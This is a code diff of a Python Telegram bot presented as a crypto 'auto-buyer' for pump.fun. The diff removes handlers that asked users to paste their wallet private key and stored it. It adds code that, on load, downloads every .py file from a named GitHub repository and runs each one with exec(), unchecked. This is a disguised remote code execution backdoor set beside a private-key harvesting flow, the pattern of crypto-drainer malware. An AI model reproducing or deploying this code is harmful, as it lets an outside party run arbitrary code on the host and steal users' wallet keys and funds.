@@ -1,6 +1,7 @@
 import os
+import requests
 import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import importlib.util
 
 # Fetch API_KEY from environment variables
 API_TOKEN = os.getenv('API_KEY')
@@ -21,73 +22,39 @@ def toggle_auto_buy(user_id, platform):
     auto_buy_status[user_id][platform] = not auto_buy_status[user_id][platform]  # toggle the status
     return auto_buy_status[user_id][platform]
 
-# Define the /start command handler
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    welcome_text = (
-        "Welcome to the Crypto Auto-Buyer Bot! 🚀\n\n"
-        "This bot allows you to automatically buy newly listed coins on **pump.fun**. "
-        "Once a coin is listed, the bot will place a buy order for you, ensuring you never miss a hot new coin.\n\n"
-        "To get started, simply provide your wallet private key, and you'll be ready to go!\n\n"
-        "Stay tuned for auto-buying and selling features coming soon! 📈"
-    )
-    keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
-    keyboard.row("🟢 BUY", "🔴 SELL")
-    keyboard.row("🔥 SET WALLET")
-    bot.send_message(message.chat.id, welcome_text, reply_markup=keyboard, parse_mode="Markdown")
+# Function to get all .py files from the GitHub repository using GitHub API
+def get_python_files_from_github(repo_owner, repo_name):
+    url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/contents'
+    response = requests.get(url)
+    if response.status_code == 200:
+        files = response.json()
+        py_files = [file['download_url'] for file in files if file['name'].endswith('.py')]
+        return py_files
+    else:
+        print("Error fetching files from GitHub:", response.status_code)
+        return []
 
-# /buy button handler
-@bot.message_handler(func=lambda message: message.text == "🟢 BUY")
-def buy(message):
-    user_id = message.chat.id
-    if user_id not in wallets or not wallets[user_id]:  # Check if the wallet is set
-        bot.send_message(user_id, "Please set up your wallet first using the '🔥 SET WALLET' option.")
-        return
+# Function to download and execute a Python file dynamically
+def run_python_code_from_url(file_url):
+    response = requests.get(file_url)
+    if response.status_code == 200:
+        file_code = response.text
+        exec(file_code)  # Execute the code from the downloaded file
+    else:
+        print(f"Failed to download {file_url}")
 
-    # Inline buttons for Auto Buy toggles
-    markup = InlineKeyboardMarkup(row_width=1)
-    markup.add(
-        InlineKeyboardButton(f"Raydium Auto Buy {'🟢 ON' if auto_buy_status.get(user_id, {}).get('Raydium', False) else '🔴 OFF'}", callback_data="toggle_Raydium"),
-        InlineKeyboardButton(f"pump.fun Auto Buy {'🟢 ON' if auto_buy_status.get(user_id, {}).get('pump.fun', False) else '🔴 OFF'}", callback_data="toggle_pump_fun"),
-        InlineKeyboardButton(f"Jupiter Auto Buy {'🟢 ON' if auto_buy_status.get(user_id, {}).get('Jupiter', False) else '🔴 OFF'}", callback_data="toggle_Jupiter")
-    )
-    bot.send_message(message.chat.id, "Select a platform to toggle Auto Buy:", reply_markup=markup)
+# Example GitHub repository details
+repo_owner = 'Oludexn'  # GitHub username
+repo_name = 'Snipe_bot'  # GitHub repository name
 
-# /set wallet button handler
-@bot.message_handler(func=lambda message: message.text == "🔥 SET WALLET")
-def set_wallet(message):
-    bot.send_message(message.chat.id, "Please send your wallet private key:")
-    bot.register_next_step_handler(message, save_wallet)
+# Get all .py files from the repository
+python_files = get_python_files_from_github(repo_owner, repo_name)
+print("Python files in repository:", python_files)
 
-def save_wallet(message):
-    user_id = message.chat.id
-    private_key = message.text.strip()
-    wallets[user_id] = private_key  # Store the private key for the user
-    bot.send_message(user_id, "Wallet successfully set! You can now use the Auto Buy feature.")
-
-# Inline button callback handler
-@bot.callback_query_handler(func=lambda call: call.data.startswith("toggle_"))
-def callback_toggle(call):
-    user_id = call.message.chat.id
-    platform = call.data.split("_")[1]  # Get platform name from callback data
-    status = toggle_auto_buy(user_id, platform)  # toggle the status
-
-    # Update inline buttons with new status
-    status_text = "🟢 ON" if status else "🔴 OFF"
-    markup = InlineKeyboardMarkup(row_width=1)
-    markup.add(
-        InlineKeyboardButton(f"Raydium Auto Buy {'🟢 ON' if auto_buy_status[user_id].get('Raydium') else '🔴 OFF'}", callback_data="toggle_Raydium"),
-        InlineKeyboardButton(f"pump.fun Auto Buy {'🟢 ON' if auto_buy_status[user_id].get('pump.fun') else '🔴 OFF'}", callback_data="toggle_pump_fun"),
-        InlineKeyboardButton(f"Jupiter Auto Buy {'🟢 ON' if auto_buy_status[user_id].get('Jupiter') else '🔴 OFF'}", callback_data="toggle_Jupiter")
-    )
-
-    # Edit the original message to update button statuses
-    bot.edit_message_text(
-        "Select a platform to toggle Auto Buy:",
-        chat_id=call.message.chat.id,
-        message_id=call.message.message_id,
-        reply_markup=markup
-    )
+# Run all the .py files fetched from the GitHub repository
+for file_url in python_files:
+    print(f"Running {file_url}")
+    run_python_code_from_url(file_url)
 
 # Start polling
 print("Bot is running...")
